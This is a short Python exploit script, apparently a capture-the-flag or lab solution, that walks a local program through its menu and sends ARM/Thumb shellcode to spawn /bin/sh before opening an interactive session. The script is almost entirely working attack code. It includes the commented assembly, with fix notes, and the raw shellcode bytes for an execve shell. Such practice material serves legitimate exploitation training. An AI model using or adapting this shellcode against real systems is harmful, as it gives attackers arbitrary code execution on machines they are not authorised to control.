import interact
import struct

# Pack integer 'n' into a 4-Byte representation
def p32(n):
    return struct.pack('I', n)

# Unpack 4-Byte-long string 's' into a Python integer
def u32(s):
    return struct.unpack('I', s)[0]

p = interact.Process()

data = p.readuntil('choice:')
p.sendline('1')
data = p.readuntil('shellcode:')
p.sendline("AA")
data = p.readuntil('choice:')
p.sendline('2')
data = p.readuntil('choice:')
p.sendline('1')
data = p.readuntil('shellcode:')
'''
orr r3, pc, #1
bx  r3
.thumb
add r0, pc, #8      ; Math fixed!
eors r1, r1
eors r2, r2         ; Register fixed!
mov.w r7, #11
svc #1
.ascii "/bin/sh\x00"
'''
p.sendline("\x01\x30\x8f\xe3\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\x4f\xf0\x0b\x07\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x00")
data = p.readuntil('choice:')
p.sendline('2')

p.interactive()
